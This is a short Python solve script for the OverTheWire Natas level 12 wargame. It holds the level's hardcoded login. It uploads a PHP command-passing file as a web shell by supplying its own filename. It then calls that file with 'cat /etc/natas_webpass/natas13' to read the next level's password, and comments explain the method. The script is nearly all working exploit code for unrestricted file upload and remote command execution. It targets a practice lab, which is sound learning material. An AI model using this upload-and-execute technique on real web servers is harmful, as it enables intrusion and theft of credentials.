#!/bin/python3

import requests
import re
import html.parser

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "filename" : "phpinject.php",  "MAX_FILE_SIZE" : "1000" }
files = { "uploadedfile" : open("phpinject.php", "rb") } 
#cookie = { "data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '',data = data ,files = files ,auth = (username,password) )

content = html.unescape(response.text)
fileurl = "/"+(re.findall('.php\">(.*.php)',content)[0]) + "?var=cat /etc/natas_webpass/natas13"

response = session.get(url + fileurl, auth = (username, password))
content = html.unescape(response.text)

#for viewing the webpage
print ((content.strip()))

#for finding the password 
#print (re.findall('.php\">(.*.php)',content)[0])

#this one requires a file to be uploaded 
#the filename will be replaced by a random string .jpg
#unless a filename is provided in the post array 
#therefore we can supply a php file that will be able to run commands
#I have made an incredibly simple php script that passes a command through to the server
#the command will be held in the get array and can be edited easily 

#the script has to make two requests
#one to upload the file and then a get request to access the uploaded script
#the rest of this doc is just to isolate the url of the uplaoded file 
#and the actual value of the password




